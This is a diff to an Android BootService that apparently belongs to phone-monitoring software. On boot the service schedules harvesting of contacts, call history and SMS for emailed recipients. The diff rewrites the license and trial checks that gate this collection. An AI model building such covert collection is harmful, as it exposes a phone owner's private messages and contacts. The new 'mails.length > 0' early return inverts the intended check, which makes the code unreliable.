@@ -81,10 +81,15 @@ public class BootService extends Service
 		
 		// Start timer to get contacts, phone call history and SMS
 		Context context = getApplicationContext();
-		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
-		String[] mails = GlobalPrefActivity.getMail(this).split(",");
+		String[] mails = GlobalPrefActivity.getMail(context).split(",");
 		mails = StrUtils.filterMails(mails);
-		if ((type != LICENSE_TYPE.NOT_LICENSED || ConfigCtrl.stillInTrial(context)) && mails.length > 0) 
+		if (mails.length > 0) return;
+		
+		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
+		if (type == LICENSE_TYPE.FULL_LICENSED  ||
+			type == LICENSE_TYPE.SUPER_LICENSED ||
+			type == LICENSE_TYPE.PART_LICENSED  ||
+			(type == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.stillInTrial(context))) 
 		{
 			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
 			
@@ -101,7 +106,7 @@ public class BootService extends Service
 		} 
 		
 		// If out of trial and not licensed, send a SMS to warn the receiver user
-		else if (type == LICENSE_TYPE.NOT_LICENSED && !ConfigCtrl.stillInTrial(context))
+		else if (type == LICENSE_TYPE.TRIAL_LICENSED && !ConfigCtrl.stillInTrial(context))
 		{
 			// If has sent before, DO NOT send again
 			if (ConfigCtrl.getHasSentExpireSms(context)) return;
